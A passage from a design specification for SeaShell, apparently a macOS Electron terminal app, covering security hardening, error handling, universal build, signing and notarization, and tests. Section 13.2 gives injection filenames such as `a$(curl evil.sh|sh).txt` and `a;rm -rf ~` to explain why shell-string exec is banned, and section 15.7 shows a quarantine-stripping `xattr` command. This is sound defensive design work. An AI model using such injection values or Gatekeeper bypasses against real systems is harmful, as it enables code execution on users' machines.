**What this does not relax.** The §9 rule stands: the viewer builds DOM with `createElement` + `el.style.color` and **never `innerHTML`** — but the reason is **untrusted-content injection**, not CSP. `style-src` governs `<style>` elements and `style=` attributes parsed from markup; CSSOM property writes are not governed by it, so the viewer is exactly as safe as before and the `no innerHTML` lint rule stays.

**Startup dev-mode assertion**, so a future CSP edit fails loudly instead of silently blanking scrollbars:

```ts
const el = document.querySelector('.xterm .xterm-scrollable-element')
const bg = el && getComputedStyle(el, '::-webkit-scrollbar-thumb').backgroundColor
if (!bg || bg === 'rgba(0, 0, 0, 0)') throw new Error('CSP_BLOCKED_XTERM_STYLE')
```

### 13.2 The rest of the posture

1. **Renderer has zero capability.** `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, served from `app://` (never `file://`), plus the CSP above. A sandboxed preload may still require `contextBridge` and `ipcRenderer`, which is all it needs — `sandbox: true` costs nothing.

2. **`shell.openPath` is guarded, because it *executes*.** `openPath` on an `.app`, `.command`, `.jar`, `.pkg`, `.dmg`, `.scpt`, `.webloc`, `.terminal`, or any file with the execute bit runs it via LaunchServices. Terminal output is attacker-influenced (a git branch name, a log line from a remote service, a filename in a cloned repo), so a hostile repo containing `pwn.command` that gets printed and double-clicked would be arbitrary code execution. Main refuses per the DENY rules in §8.6 — **evaluated against the realpath** (§8.3) — and calls `shell.showItemInFolder` with a notice instead.

3. **Never build a shell command line.** `shell.openPath` goes through NSWorkspace/LaunchServices with the path as a single argument — no shell is involved. `child_process.exec('open ' + p)` with a filename like `a$(curl evil.sh|sh).txt` or `a;rm -rf ~` is command execution. An ESLint `no-restricted-properties` rule bans `child_process.exec` and `execSync` across `src/main/**`. The `lsof` and `ps` samplers use `execFile` with an argv array.

4. **`shell.openExternal` is never called with terminal-derived text.** The only path to it is `open:externalHttp`, which rejects any scheme other than `http:` and `https:`, and is reachable only from xterm's OSC 8 `linkHandler`. xterm 6's `allowNonHttpProtocols` is left off.

5. **Clipboard is write-broad, read-narrow.** `clip:write` accepts at most **100 KB, enforced in main**, and only when the owning pane is focused. `clip:read` is reachable only from the ⌘V menu handler and is never handed to an addon or to any terminal-driven code path — so no program can exfiltrate the user's clipboard. OSC 52 is **not implemented in v1**: Terminal.app does not support it either, so implementing it would be a deviation from the fidelity target rather than a requirement of it. If it is ever added (§19), it is added as a custom `IClipboardProvider` whose `readText` returns `''` unconditionally, preserving this asymmetry.

6. **Env is main's.** `pty:spawn` carries no env map. `runAfterStart` is a single command string placed by main into exactly one whitelisted variable (`SEASHELL_RUN`, §6.1). Argv is always a `string[]`, never a shell string. A non-existent `cwd` is resolved up to the nearest existing readable ancestor, and `ECWD` is reserved for an unreadable `$HOME`.

7. **Path validation is main's.** Every path the renderer sends is `path.resolve`d, `lstat`ed, `realpath`ed, and DENY-checked in main before anything happens to it (§8.3). The renderer's stat cache is an optimization, never an authority.

8. **Entitlements are minimal**: `com.apple.security.cs.allow-jit` and `com.apple.security.cs.disable-library-validation`, nothing else (§15.5).

---

## 14. Error handling

Every row names the `ui:notice` **code** it emits (§12), or `—` where the surface is inline rather than a notice. A test asserts that the set of codes emitted by `src/main/**` is exactly the set listed here, so the table and the channel cannot drift apart.

| Condition | Code | User sees | App does |
|---|---|---|---|
| PTY spawn failure | — (inline) | Pane body: red `Could not start /bin/zsh — ENOENT`, with **Retry** and **Change command** | No session in main's map; the renderer keeps the leaf so the grid does not reflow; logs argv + cwd |
| Spawn cwd no longer exists | `CWD_FALLBACK` | One-line dismissible pane notice `~/Desktop/gone no longer exists — started in ~` | Spawn **succeeds** in the nearest existing readable ancestor; `cwdFallback` returned (§6.1) |
| `spawn-helper` not executable at startup | `HELPER_NOT_EXEC` | Modal: `SeaShell can't start terminals — the PTY helper is not executable.` with the resolved path | Startup self-check `fs.accessSync(helperPath, X_OK)` fails loudly rather than producing dead panes |
| PTY exits non-zero | — (overlay) | Bottom overlay `claude exited · code 1` + **Restart** / **Copy last 200 lines** | Session removed, batcher entry dropped, layout unchanged, buffer read-only and scrollable |
| PTY exits 0 | — (overlay) | Same overlay, neutral styling | Identical. Never auto-close — users need to read final output |
| PTY killed by signal | — (overlay) | `claude killed · SIGKILL (9)` + **Restart** | Same. **Suppressed entirely when `session.closing`** (§6.4) |
| Processes survive a pane kill | `REAP_SURVIVORS` | `2 processes could not be reaped (detached from the terminal)` listing pid + comm | From `pty:kill`'s `survivors: Array<{pid, comm}>`; logged; never silently swallowed |
| Master fd not released within 2 s | `PTY_FD_LEAK` | Counted into the same survivors notice | Logged with paneId + pid (§6.5 step 5) |
| Renderer process crashes | `RENDERER_RELOADED` | Window reloads once; layout restored from last save; notice on return | **Every session's kill ladder runs first**, batcher + `unacked` cleared, `rendererEpoch` bumped, then reload (§6.5). A second crash within 30 s shows a dialog instead of looping |
| Quit reply never arrives | `—` (logged) | Nothing; the app quits | `QUIT_TIMEOUT` logged after 2,000 ms; last known state persisted; ladders run in parallel; `app.exit(0)` (§6.5) |
| `fs:statBatch` miss | — | The path is simply not linkified | Omitted from results, negatively cached 10 s; no error surfaced |
| `fs:readDir` EACCES | — | Row greyed with a lock glyph, not expandable | Returns `{ok:true, entries:[], denied:true}`; no retry loop |
| `fs:readDir` symlink cycle | — | Row renders `symlink loop`, not expandable | Returns `{ok:true, entries:[], cycle:true}` (§7) |
| Viewer read failure | `VIEWER_READ_FAILED` | `Can't read <name> — permission denied` + **Open in default app** | Falls back to `shell.openPath` |
| Viewer file too large / binary | `VIEWER_ROUTED` | `2.4 MB binary file — opening in the default app` | Auto-routes to `shell.openPath` and closes the panel |
| `shell.openPath` returns a non-empty string | `OPEN_FAILED` | The returned string, verbatim | Logged with the path |
| Double-clicked path is on the DENY list | `OPEN_BLOCKED` | `Opening executables is blocked — revealed in Finder instead` | `shell.showItemInFolder` |
| Corrupt / future-version state file | `STATE_CORRUPT` | `Previous layout couldn't be read. Saved a copy as state.corrupt-2026-07-31T05-12-03.json.` | Returns defaults; bad file preserved, never deleted (§11.3) |
| `state:save` write fails (ENOSPC/EACCES) | `STATE_SAVE_FAILED` | `Couldn't save your layout — ENOSPC` with a **Retry** action | Logged; the app does **not** block quit on it |
| Layout minimum exceeds the work area | `LAYOUT_CRAMPED` | One-time notice that panes are below the normal minimum size | Keeps the tree; renders below `MIN_COLS`/`MIN_ROWS` rather than fighting the window manager (§5.3) |
| IPC handler throws | `EINTERNAL` | `Something went wrong (fs:readDir)`; UI stays interactive | `ipc-router` try/catch → `{ok:false, code:'EINTERNAL'}`, stack to `userData/logs/main.log` |
| IPC payload fails zod | — | Nothing — this is a bug, not user input | Rejected, `WARN ipc-reject <channel> <issue>` logged; counted as a CI test failure |
| WebGL context lost | — | Nothing visible; pane keeps rendering | Dispose addon → DOM renderer; one retry after 1000 ms; second loss → DOM permanently, logged |
| WebGL never initializes | `WEBGL_UNAVAILABLE` | `Software rendering — box borders may show gaps` | DOM renderer; dismissible but reappears next launch |
| Terminal font unreadable | `FONT_FALLBACK` | `Using Menlo — SF Mono not available` | Falls back to Menlo at 15px |
| Bold or italic face missing | `FONT_SYNTHETIC` | Nothing user-facing | `document.fonts.check` assertion logs a warning (§4.2) |
| ZDOTDIR shim unwritable | `SHIM_UNWRITABLE` | Restart card reads `couldn't initialize the shell hook — press Restore to run claude` | Falls back to `lsof` cwd sampling only (§6.2) |
| `ps` sweep fails or times out (> 2 s) | `SWEEP_FAILED` | Memory readouts show `—` | Poller backs off to 30 s, retries, logs once; badges are unaffected (they are byte-derived, §10.3) |
| `lsof` cwd sample fails | `LSOF_FAILED` | Labels stop updating | Falls back to spawn cwd; cwd-relative linkification suppressed; logged once |
| Pane count would exceed 6 | — | Tooltip `Tab is full (6 panes) — open a new tab (⌘T)` | ⌘D and "+" disabled; a 7th insert is a no-op |
| Pane RSS total crosses the derived amber / red threshold | — | Status-bar segment turns amber / red, with the derived numbers in its tooltip | **Never kills anything** (§10.2) |

---

## 15. Build and distribution

### 15.1 The central decision: nothing is cross-compiled

`node-pty@1.1.0` depends on `node-addon-api ^7.1.0`, i.e. it is a **Node-API** addon, and its npm tarball already ships `prebuilds/darwin-x64/` and `prebuilds/darwin-arm64/`, each with `pty.node` and `spawn-helper`. Verified: `nm -u prebuilds/darwin-arm64/pty.node` shows 38 `napi_*` imports and **zero** V8/node-internal symbols, and the stock unmodified prebuild loads and spawns a working PTY under Electron 43.2.0 (Node 24.18.0, ABI 148) with no rebuild. `@electron/get` downloads both Electron dists regardless of host architecture. Therefore the "cross-compile a C++ addon to arm64 from an Intel Mac" problem does not exist for SeaShell.

Cutting the C sweep helper (§10.1) means **node-pty's two prebuilds are the only native artifacts in the bundle**, so this section shrank accordingly. ABI 148 is informational only: N-API is ABI-stable.

### 15.2 The three verified footguns

**1. `npmRebuild` defaults to `true`.** electron-builder would run `@electron/rebuild` against node-pty, compile a single host-arch binary into `build/Release`, and node-pty's loader prefers `build/Release` over `prebuilds/` — silently producing a "universal" app whose PTY layer is x86_64-only. It passes every test on this Intel host and is 100% dead on Apple Silicon. **Set `npmRebuild: false`.** CI gate: fail the build if `node_modules/node-pty/build/Release` exists.

**2. `spawn-helper` ships mode 0644 with no execute bit**, and node-pty contains no `chmod` anywhere. Reproduced on this host: `pty.spawn()` throws `Error: posix_spawnp failed.`; `chmod +x` fixes it. npm 11.17 additionally gates lifecycle scripts behind `npm approve-scripts`, so node-pty's own postinstall cannot be relied on. Fixed in **three** places: the repo's own `postinstall`, the electron-builder `afterPack` hook, and a startup self-check.

**3. `@electron/universal` throws on identical thin Mach-O files.** Both slice-apps contain both prebuild directories at identical paths with identical SHAs, which triggers `Detected file "…" that's the same in both x64 and arm64 builds and not covered by the x64ArchFiles rule`. Pre-`lipo`ing the prebuilds into fat binaries takes the earlier `isUniversalMachO` branch, which skips lipo without error. Verified working; no `x64ArchFiles` config needed.

### 15.3 `scripts/make-pty-universal.sh` (run from `postinstall`)

```bash
#!/bin/bash
set -euo pipefail
P=node_modules/node-pty/prebuilds
T=$(mktemp -d)
for f in pty.node spawn-helper; do
  if lipo -info "$P/darwin-x64/$f" | grep -q 'x86_64 arm64'; then
    cp "$P/darwin-x64/$f" "$T/$f"
  else
    lipo -create "$P/darwin-x64/$f" "$P/darwin-arm64/$f" -output "$T/$f"
  fi
done
for a in darwin-x64 darwin-arm64; do
  for f in pty.node spawn-helper; do cp "$T/$f" "$P/$a/$f"; done
  chmod 0755 "$P/$a/spawn-helper"
done
rm -rf "$T"
lipo -info "$P"/darwin-*/pty.node        # must print x86_64 arm64 for both
lipo -info "$P"/darwin-*/spawn-helper    # must print x86_64 arm64 for both
```

Verified end-to-end: both directories become fat, SHAs match across directories, `lipo` preserves each slice's ad-hoc linker signature (`codesign -v -a arm64 pty.node` → "valid on disk", "satisfies its Designated Requirement"), and Electron 43.2.0 still spawns a PTY. The script is idempotent, so it is safe in `postinstall`.

`package.json`:

```json
"scripts": {
  "postinstall": "bash scripts/make-pty-universal.sh",
  "dist": "bash scripts/verify-universal.sh && electron-builder --mac --universal"
}
```

**`clang` is no longer a build dependency** on any machine or in CI — that was a consequence of compiling the sweep helper in `postinstall`, and it went with it (§10.1).

### 15.4 `electron-builder.yml`

```yaml
appId: com.joshwald.seashell
productName: SeaShell
npmRebuild: false
buildDependenciesFromSource: false
asar: true
asarUnpack:
  - "**/node_modules/node-pty/**"
afterPack: build/afterPack.cjs
mac:
  category: public.app-category.developer-tools
  target:
    - { target: dmg, arch: [universal] }
    - { target: zip, arch: [universal] }
  hardenedRuntime: true
  gatekeeperAssess: false
  entitlements: build/entitlements.mac.plist
  entitlementsInherit: build/entitlements.mac.plist
  notarize: true
  extendInfo:
    NSSupportsAutomaticGraphicsSwitching: true
```

There is no `extraResources` block — the only thing that lived there was the sweep helper.

`asarUnpack` is explicit for determinism. node-pty's loader does `helperPath.replace('app.asar', 'app.asar.unpacked')`, so the module must be inside `app.asar` **and** listed here — placing node-pty outside the asar produces `app.asar.unpacked.unpacked` and dead panes.

Verified electron-builder flow: pack `-x64-temp` and `-arm64-temp` (both `sign:false`, `disableAsarIntegrity:true`, `disableFuses:true`) → copy `Assets.car` x64→arm64 → `makeUniversalApp` (`mergeASARs` defaults true) → remove temps → `afterPack` → add Electron fuses → sign **once**.

**`afterPack` fires three times** (x64 slice, arm64 slice, merged app). Branch every hook on `context.arch === Arch.universal` (builder-util `Arch` enum: `ia32=0, x64=1, armv7l=2, arm64=3, universal=4`). `build/afterPack.cjs` must, on the universal pass only:

1. `chmod 0755` `<app>/Contents/Resources/app.asar.unpacked/node_modules/node-pty/prebuilds/*/spawn-helper` and assert `mode & 0o111`.
2. Assert `lipo -archs` prints `x86_64 arm64` for both prebuilt `pty.node`s and both `spawn-helper`s.

### 15.5 Entitlements — `build/entitlements.mac.plist`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>com.apple.security.cs.allow-jit</key><true/>
  <key>com.apple.security.cs.disable-library-validation</key><true/>
</dict></plist>
```

**Only these two.** Omit `com.apple.security.cs.allow-unsigned-executable-memory`: electron-builder's bundled default template still includes it, but `@electron/notarize`'s README states it must not be applied on Electron 12+ because it needlessly widens attack surface. Overriding the default template is mandatory, not optional. No App Sandbox, so `com.apple.security.inherit` is not needed — PTY children (`zsh`, `claude`) are ordinary unsandboxed processes.

The release gate asserts the shipped set with `codesign -d --entitlements - SeaShell.app`.

### 15.6 Signing and notarization

**Unsigned arm64 code is SIGKILLed on Apple Silicon.** macOS requires every arm64 executable to carry a signature (ad-hoc suffices for local runs, Developer ID for distribution). An Intel-host build that skips signing works perfectly here and is dead on arrival on every M-series Mac. **Never publish an unsigned universal build.**

Full Xcode is **not** required. Verified present in Command Line Tools on this host: `/Library/Developer/CommandLineTools/usr/bin/notarytool` (version 1.0.0 (38)) and `stapler`.

Authenticate with an App Store Connect API key: `APPLE_API_KEY`, `APPLE_API_KEY_ID`, `APPLE_API_ISSUER`. Developer ID cert via `CSC_LINK` + `CSC_KEY_PASSWORD`. (The Apple-ID alternative — `APPLE_ID`, `APPLE_APP_SPECIFIC_PASSWORD`, `APPLE_TEAM_ID` — is documented but not used.)

Budget **2–15 minutes** for notarization. If invoking notarytool directly: `xcrun notarytool submit <archive> --key … --key-id … --issuer … --wait --timeout 30m -f json`. On rejection, pull the full log with `xcrun notarytool log <submission-id>`. `gatekeeperAssess: false` keeps failures at the explicit verification step rather than mid-pack.

**Release verification gate** — `scripts/verify-universal.sh`, all five must pass before publishing:

```bash
codesign -dvvv --entitlements - "dist/mac-universal/SeaShell.app"
codesign -v --deep --strict -a arm64 "dist/mac-universal/SeaShell.app"
lipo -info "dist/mac-universal/SeaShell.app/Contents/Resources/app.asar.unpacked/node_modules/node-pty/prebuilds/darwin-arm64/pty.node"
spctl --assess -vvv --type execute "dist/mac-universal/SeaShell.app"
xcrun stapler validate dist/SeaShell-*.dmg
```

Plus a **real Apple Silicon smoke test** (borrowed machine or a `macos-26` runner launching the app and spawning one pane) before any public release. The Intel developer host cannot detect an arm64-only failure.

### 15.7 Gatekeeper

GitHub Release downloads carry `com.apple.quarantine` (confirmed on real files on this host, e.g. `0081;68bb5289;Chrome;`). Notarized **and stapled** builds launch cleanly offline — staple the `.app` before zipping, and staple the `.dmg` itself. If notarization is ever deferred for a tester build, label it "unsigned test build" and document exactly one workaround:

```bash
xattr -dr com.apple.quarantine /Applications/SeaShell.app
```

### 15.8 CI — tests and guards only; releases are built locally

Single job, **no matrix**, `runs-on: macos-26` (arm64 standard; `macos-26-intel` is the x64 label; `macos-15-intel` is the last Intel image, retiring August 2027). Because nothing compiles for Node, the runner's architecture is irrelevant.

```yaml
steps:
  - uses: actions/checkout@v4
  - uses: actions/setup-node@v4
    with: { node-version: 22 }
  - run: npm ci                     # runs make-pty-universal.sh
  - run: test ! -d node_modules/node-pty/build/Release   # npmRebuild guard
  - run: |
      for f in node_modules/node-pty/prebuilds/darwin-*/pty.node \
               node_modules/node-pty/prebuilds/darwin-*/spawn-helper; do
        lipo -info "$f" | grep -q 'x86_64 arm64' || { echo "NOT UNIVERSAL: $f"; exit 1; }
      done
  - run: node scripts/docs-lint.mjs # every §N.M in the spec resolves to a heading
  - run: npm run test               # all four vitest projects
```

**The signed, notarized release build is produced on the developer machine with `npm run dist`, not in Actions.** This is a personal tool with one user; putting a Developer ID certificate and an App Store Connect API key into GitHub secrets so a workflow can `--publish always` buys automation nobody needs and widens the blast radius of a compromised action. The guards that matter (`npmRebuild`, `lipo`, tests, docs-lint) stay in CI, where they run on every push; the ones that need signing material live in `scripts/verify-universal.sh`, invoked by `npm run dist`.

Local universal builds are development-only: a universal build materializes two full app trees plus the merged one before deleting temps, and a single Electron install measures 383 MB. Clean `dist/` and the `-x64-temp` / `-arm64-temp` directories between local builds, and do not run universal packaging concurrently with other Claude Code sessions.

### 15.9 The architecture review gate

**Every new native dependency must be Node-API and must publish both `darwin-x64` and `darwin-arm64` prebuilds.** Anything else reopens genuine arm64 cross-compilation and is a design change requiring explicit approval.

The `declare module 'node-pty' { interface IPty { readonly ptsName: string } }` augmentation in `src/main/pty/manager.ts` (§6.1) is part of this gate: **it must be re-verified against the typings on any node-pty upgrade**, because it asserts a runtime property that the published interface does not declare.

The fallback recipe, verified available on this CLT-only Intel host (`clang -target arm64-apple-macos11` compiles and links both C and C++20; SDK 15.5 at `/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk` carries arm64 `.tbd` slices):

```bash
npm_config_runtime=electron \
npm_config_target=43.2.0 \
npm_config_disturl=https://electronjs.org/headers \
npm_config_arch=arm64 npm_config_target_arch=arm64 \
npm_config_build_from_source=true npm rebuild
# or:
npx @electron/rebuild@4.2.0 -v 43.2.0 -a arm64 -f
```

If a module's `binding.gyp` ignores `target_arch`, build that slice on a `macos-26` arm64 runner and merge artifacts with `lipo`.

---

## 16. Testing strategy

**Vitest 4.1.10** using v4's `projects` array in `vitest.config.ts` (the `workspace` file is gone in v4). Root `test` keys cascade as defaults. Run one project with `vitest --project pty`. **Four projects: `unit`, `dom`, `pty`, `e2e`.** The fourth exists because three of the highest-risk regressions in this design (risk 6, risk 9, risk 15) can only be observed in a real Electron renderer, and an earlier draft filed all three under a node-environment project where they were unwritable.

### 16.1 `unit` — `environment: 'node'`, no DOM, no Electron

Targets are the `[pure]` modules only.

- **Layout**: `autoInsert(tree, N)` for **N = 1…6** against the §5.2 table; `minPx(node)` bottom-up propagation; the drag clamp at `MIN_COLS=20` / `MIN_ROWS=6`; the once-computed worst-case window minimum; close-reflow ratio conservation (`Σ ratios === 1 ± 1e-9`); focus-after-close ordering; serialize → deserialize round trip; the depth-3 invariant is never violated by any operation; **and one explicit case asserting that inserting a 7th pane is refused and leaves the tree byte-identical.** (An earlier draft tested N = 1…9 and `rebalance` agreement at N = 9, exercising states `MAX_PANES_PER_TAB = 6` makes unreachable — the arithmetic happens to agree at 7–9, so those tests would pass while testing dead code and masking a regression in the actual refusal path. `rebalance` itself is gone, §5.2.)
- **Tokenizer**: table cases `src/a.ts:12:4`, `(/tmp/x.log)`, `"/Users/j/My Docs/a.txt"`, `/tmp/a\ b.txt`, `/tmp/a(1).txt`, `~/Desktop/x`, `./rel.md`, `Makefile`, and negatives `v1.2.3`, `https://x/y`, `--flag=x`, `3.14`, plain prose, plus `a.ts(3,9)` asserted **not** to yield a line/col suffix (§8.2). Every fixture is additionally asserted to produce **identical spans through the hover path and the double-click path**.
- **`idxMap`**: wide characters — `日本語/файл.ts`, an emoji, a zero-width joiner sequence — column positions exact.
- **`cellFromEvent`**: a fixture table of `(rect, cols, rows, clientX, clientY, padding) → (col, row)` including both boundary edges and out-of-bounds clamping.
- **`classify()`** (§8.6): every viewer extension, every DENY extension, executable-bit files, FIFO/socket/device, `/dev/*`, symlinks whose realpath is a DENY target, and the sniffer on PNG / ELF / Mach-O / UTF-8 / **latin-1-without-NUL** / null-byte fixtures. The latin-1 case is the one that used to route two different ways.
- **Env**: `buildEnv()` has no `COLORTERM` key, `TERM === 'xterm-256color'`, `TERM_PROGRAM === 'SeaShell'`, no `ELECTRON_*`, no `npm_*`, and `SEASHELL_RUN` present only when `runAfterStart` is non-null.
- **`.gitignore` stacking**: anchored `/dist`, `node_modules/`, `*.log`, negation `!keep.log`, nested `.gitignore` precedence; plus `node_modules` / `.git` / `.DS_Store` returned with `ignored: true` rather than dropped (§7).
- **`ps-parse`**: against a captured `/bin/ps` fixture containing `??` tty rows, other-uid rows, and a valid `ttys004` row; asserts `paneProcs` builds **no tty arm** for a `??` or malformed `pane.tty`, filters to `process.getuid()`, and yields exactly the expected pids.
- **`PtyBatcher`**: flush timing with fake timers keyed on `pane.visible` (8 ms / 100 ms), the 64 KiB immediate-flush threshold, the **messages-emitted-per-second** assertion (§6.6), the 1 MiB / 256 KiB pause/resume thresholds, and **resume-on-epoch-change**.
- **State**: serialize → validate round trips, including truncated, empty, `{}`, `schemaVersion: 99`, and a tree with a duplicate `paneId`; the write call order `write → fh.sync → close → rename → dir.sync` against a mocked `fs`; the window-rect off-screen recentering rule.
- **Stat cache**: 4096-entry eviction, 60 s positive / 10 s negative TTL.
- **IPC schemas**: a 257-element `fs:statBatch` payload is rejected by zod; a 100_001-char `clip:write` is rejected in main.
- **Palette**: `palette.json` has exactly 16 ANSI entries plus `background` / `foreground` / `cursor` / `selectionBackground`, and matches the committed reference hash (§4.4).
- **Notice codes**: the set of `ui:notice` codes emitted anywhere in `src/main/**` equals the set enumerated in §14.

### 16.2 `dom` — `environment: 'happy-dom'` (20.11.1) + `@testing-library/react`

Title-bar double-click zoom toggle (including the `.pane-label-input` / `.pane-close` guard); drag-resize ratio clamping through a synthetic pointer sequence; hidden-pane class computes `display: none`; tree expand/collapse and keyboard navigation; viewer virtual-window math; the drag-a-file-into-a-pane quoting (`'` → `'\''`).

Plus three that need a real `@xterm/xterm` `Terminal` (not `@xterm/headless`):

- **`provideLinks` returns the exact 1-based range** for a written known path. This cannot live in `pty`: verified against `@xterm/headless@6.0.0`'s `typings/xterm-headless.d.ts`, it exposes `buffer`, `modes`, `unicode` and `allowProposedApi` but has **no `registerLinkProvider`, no `ILinkProvider`, and no `select()`**.
- **Option+double-click writes zero bytes** while DECSET 1000 is active, asserted against a stubbed `seashell.pty.write` spy — and a plain double-click in the same state **does** write an SGR mouse report.
- **The viewer focus zone**: dispatching the `close-pane` `ui:command` while `appFocusZone === 'viewer'` closes the panel and leaves the pane session untouched (§5.5).

And one that needs shiki: **instantiate the highlighter with `createJavaScriptRegexEngine()` and assert a non-empty token array** — a regression here would otherwise ship a viewer with no colors (§9).

### 16.3 `pty` — `environment: 'node'`, `pool: 'forks'`, `poolOptions.forks.singleFork: true`, `testTimeout: 20000`

This recipe is verified working on this machine today:

```ts
import { spawn } from 'node-pty'
import { Terminal } from '@xterm/headless'
const term = new Terminal({ cols: 80, rows: 24, allowProposedApi: true })  // REQUIRED: .buffer is EXPERIMENTAL
const p = spawn('/bin/zsh', ['-lc', 'printf "\\033[31mRED\\033[0m plain\\r\\n"'], {
  name: 'xterm-256color', cols: 80, rows: 24, cwd: os.homedir(),
  env: { ...process.env, TERM: 'xterm-256color' },
})
p.onData(d => term.write(d))
await exited(p)
await new Promise(r => term.write('', r))          // flush xterm's async parser
const l = findLine(term, 'RED')                    // never assume row 0 — .zprofile prints noise
expect(l.translateToString(true)).toBe('RED plain')
expect(l.getCell(0)!.getFgColor()).toBe(1)
expect(l.getCell(0)!.isFgPalette()).toBe(1)
```

Cases:

1. Smoke: one PTY spawns and produces output within 3 s. Fails loudly on `posix_spawnp` (the `spawn-helper` regression).
2. SGR colors plus bold, dim, italic, underline, strikethrough.
3. A 256-color cell and a 24-bit truecolor cell.
4. `\r` overwrite semantics.
5. Alt screen enter/exit (`\x1b[?1049h` / `l`) leaves scrollback intact.
6. `resize(120, 40)` then back to `(80, 24)`: assert the non-whitespace content of every one of 200 known transcript lines is unchanged.
7. CJK and emoji width with `@xterm/addon-unicode11`.
8. A 5 MB flood: no dropped bytes, and `pause()`/`resume()` both fired.
9. `kill('SIGTERM')` produces `onExit` within 2 s.
10. The full §6.5 kill ladder against a pane running a foreground job plus `(sleep 601 &)`: zero survivors.
11. **Renderer-crash reaping**: spawn three panes, force-kill the renderer, assert `paneProcs()` returns zero survivors for all three (§6.5).
12. **Mouse mode, headless half**: write `\x1b[?1000h\x1b[?1006h` and assert `term.modes.mouseTrackingMode === 'vt200'`. (The event half of the old case 12 moved to `dom`; the WebGL and `onRender` cases moved to `e2e`.)
13. Open and close 200 panes; assert `lsof -p <main pid> | wc -l` grows by fewer than 400 (guards the fd leak fixed in node-pty 1.2.0-beta).
14. **OSC 7 round-trip through the real shim**: spawn a pane, `cd` into a directory named `~/Desktop/日本 test` — a space **and** a multi-byte character — and assert the emitted OSC 7 payload survives `decodeURIComponent(new URL(d).pathname)` back to that exact absolute path (§6.2).
15. **`SEASHELL_RUN` determinism**: spawn with `runAfterStart: 'printf READY\\n'` against a `.zshrc` that sleeps 800 ms before returning, and assert the output appears and the command is in `fc -l` history — i.e. it did not race the prompt (§6.1).

**The Claude-session fidelity fixture** — the one automated guard on goal 1:

16. Commit `test/fixtures/claude-session.vt`: a raw byte capture of a real `claude` session taken with `script -q`, covering the startup banner, a thinking spinner, a syntax-highlighted code block, a diff, and an alt-screen `less`. Replay it through `@xterm/headless` at 100×30 and assert an `@xterm/addon-serialize` snapshot.

Without 16, the single non-negotiable requirement is covered only by the manual checklist, and a regression in the palette JSON, the spawn env, the unicode11 width table, or alt-screen/reflow behavior ships silently until someone runs 24 rows by hand. (`@xterm/addon-serialize` is retained as a devDependency specifically for this; one reviewer proposed dropping it in favour of `translateToString`, which cannot capture attributes or colors and so cannot serve as a fidelity snapshot.)

### 16.4 Manual fidelity checklist

**This checklist is the operative definition of "passes fidelity" (§1 goal 1).** Run `claude` in Terminal.app and in a SeaShell pane at identical cols×rows, side by side on the same display. Every row must match.

0. **Before starting**: confirm Terminal.app is on the **Homebrew** profile (the machine default), and set its font to **SF Mono 13 pt** for the duration so both sides share a size (§4.2). Confirm in Settings ▸ Profiles ▸ Homebrew that *Use bright colors for bold text* is **off** and *Use Option as Meta key* is **on**, matching §4.1's table.
1. Startup banner box-drawing characters align — no gaps, no doubled borders — at 80 and at 120 columns.
2. Rounded panel corners `╭ ╮ ╯ ╰` and `═ ╣ ╠` render as joined strokes.
3. The spinner during a long tool call is smooth: no flicker, no ghost rows on redraw.
4. Streaming answer text wraps at the same column; window resize reflows identically in both.
5. Syntax-highlighted code blocks show identical colors; diff `+`/`-` green and red match.
6. Bold, dim, italic, underline, and strikethrough each render **distinctly and identically** — this is the row the two-font-face load of §4.2 exists for. *Known accepted difference: Terminal.app applies the profile's separate `TextBoldColor` (`#00FF00`) to bold text; xterm's `ITheme` has no bold-foreground slot, so SeaShell renders bold in `foreground` (`#28FE14`). One channel differs by 24/255 (§4.4).*
7. 16-color and 256-color ramps: sampled pixels within ±2/255 per channel.
8. `✓ ✗ ✨ ❯` render at the same width and baseline.
9. `⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏` and `⣿⣷⣯⣟` (braille) render at the same advance and baseline. *Known cosmetic risk: no monospace font on macOS covers U+2800–U+28FF, so these fall to `Apple Symbols` via the pinned fallback stack. `rescaleOverlappingGlyphs: true` bounds the damage. Treat a mismatch here as cosmetic, not blocking.*
10. Emoji and CJK occupy 2 cells; the cursor lands in the same column after typing past them.
11. Interactive prompts (arrow-key menu, y/n) highlight the same row; arrows, Enter, Esc, Tab behave the same.
12. ⌃C interrupts mid-stream and returns the prompt in both; ⌃D exits; ⌃L clears.
13. Bracketed paste of a 200-line block: appears as one unit, no per-line execution, no reordering.
14. Alt-screen tools (`less`, `vim`) enter and exit leaving the scrollback exactly as before.
15. Scroll back 1000 lines: content matches; no missing or duplicated rows.
16. Text selection copies with the same trailing-whitespace trimming; ⌘V pastes identically.
17. Cursor shape and blink match while idle and during output (block, blinking — §4.1).
18. Resize to 40 columns mid-stream: neither terminal corrupts the in-flight line.
19. Window unfocus/refocus while Claude is thinking (DECSET 1004 focus reporting) causes no visual change.
20. `printf '\e]8;;https://anthropic.com\e\\link\e]8;;\e\\\n'` renders an activatable hyperlink in both.
21. Shift+Enter inserts a newline in Claude Code's input box without submitting.
22. `echo $TERM` → `xterm-256color`; `tput colors` → `256`; `stty size` matches the pane; `echo $COLORTERM` prints an empty line.
23. **Shift+Enter at a bare `zsh` prompt** (no TUI running) behaves exactly as it does in Terminal.app — the §4.3 rewrite must not fire when `mouseTrackingMode === 'none'`.

Anti-aliasing differences between Skia and Core Text are out of scope (§1 goal 1) and are never a failing row.

### 16.5 `e2e` — real Electron via Playwright's `_electron.launch`

Three assertions that require a GPU, a real renderer and real layout, and therefore cannot live in `pty` (`environment: 'node'`) or `dom` (happy-dom):

1. **Eight tabs × 6 panes: live WebGL context count ≤ 12** — the §4.5 two-tab LRU bound. (An earlier draft asserted ≤ 6 against a dispose-every-tab-switch policy; the bound moved with the policy.)
2. **Six panes streaming with one zoomed**: the hidden terminals' `onRender` fires **zero** times, and total CPU stays under 2%.
3. **`display: none` on hidden panes** asserted against real computed style in a real window, not happy-dom.

Plus a launch smoke test: the app starts, spawns one pane, and the §13.1 CSP assertion does not throw.

---

## 17. Risks and mitigations

Blockers first.

| # | Sev | Risk | Mitigation |
|---|---|---|---|
